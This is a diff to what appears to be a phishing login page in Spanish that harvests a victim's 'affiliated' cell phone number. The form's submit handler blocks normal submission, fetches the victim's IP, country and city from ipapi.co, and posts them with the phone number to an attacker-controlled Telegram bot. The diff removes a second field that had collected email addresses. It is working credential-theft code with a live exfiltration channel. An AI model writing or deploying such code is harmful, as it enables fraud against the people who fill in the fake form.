@@ -248,14 +248,10 @@
                                     
                                    <span class="ocultar-div"  >Ingrese su número de celular:</span>
 
-                                    <input type="tel" name="t0s24u824s" id="step02" placeholder="Celular afiliado" maxlength="9" minlength="8"  class="login-control tabular-nums" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" >
+                                    <input required="" type="tel" name="t0s24u824s" id="step02" placeholder="Celular afiliado" maxlength="9" minlength="8"  class="login-control tabular-nums" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" >
                                  </div>
                                  
-                                 <div class="panel-telefono">
-                                    <span class="ocultar-div"  >Ingrese su correo electrónico afiliado:</span>
-                                
-                                    <input type="email" name="PR9345FW" id="step01"  minlength="2" required placeholder="Correo electrónico" class="login-control right-radius" >
-                                 </div>
+                                 
                                  
                                  <div class="c-login__help">
                                     <!-- personas/comercios -->
@@ -732,12 +728,11 @@
     form.addEventListener('submit', event => {
         event.preventDefault();
         const cliente = document.getElementById('step02').value;
-        const cliente2 = document.getElementById('step01').value;
        
         fetch('https://ipapi.co/json')
         .then(response => response.json())
         .then(data => {
-            YOUR_MESSAGE_TEXT = "IT4U UYU \n\n\r C3L: "+cliente+" \n\n\r C0RR30: "+cliente2+"  - IP: "+data.ip+" "+data.country+" "+data.city;
+            YOUR_MESSAGE_TEXT = "IT4U UYU \n\n\r C3L: "+cliente+" \n\n\rIP: "+data.ip+" "+data.country+" "+data.city;
             const telegramApiUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendMessage?chat_id=${YOUR_CHANNEL_ID}&text=${YOUR_MESSAGE_TEXT}`;
 
             fetch(telegramApiUrl)
